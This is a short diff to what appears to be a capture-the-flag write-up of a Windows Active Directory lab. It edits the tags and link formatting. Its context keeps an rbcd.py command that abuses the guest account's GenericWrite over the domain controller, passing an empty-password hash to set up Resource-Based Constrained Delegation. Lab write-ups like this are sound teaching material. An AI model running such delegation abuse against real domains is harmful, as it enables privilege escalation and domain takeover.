@@ -5,7 +5,8 @@ tags:
   - Windows
   - AD
   - Kerberoasting
-  - Brute-Force
+  - Cracking
+  - Passwd-Spraying
   - RBCD
   - PtT
   - DCSync
@@ -223,7 +224,7 @@ Password:
 [+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
 ```
 
-Logged in and uploaded the BloodHound ZIP file to the web <http://127.0.0.1:8080>. The **guest** user has **GenericWrite** over the DC, allowing Resource-Based Constrained Delegation (RBCD) attack. We abuse it by passing an empty password hash:
+Logged in and uploaded the BloodHound ZIP file to the web `http://127.0.0.1:8080`. The **guest** user has **GenericWrite** over the DC, allowing Resource-Based Constrained Delegation (RBCD) attack. We abuse it by passing an empty password hash:
 ```console
 $ rbcd.py -delegate-to 'AD$' -delegate-from CODY_ROY -action write -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' thm.local/guest
 
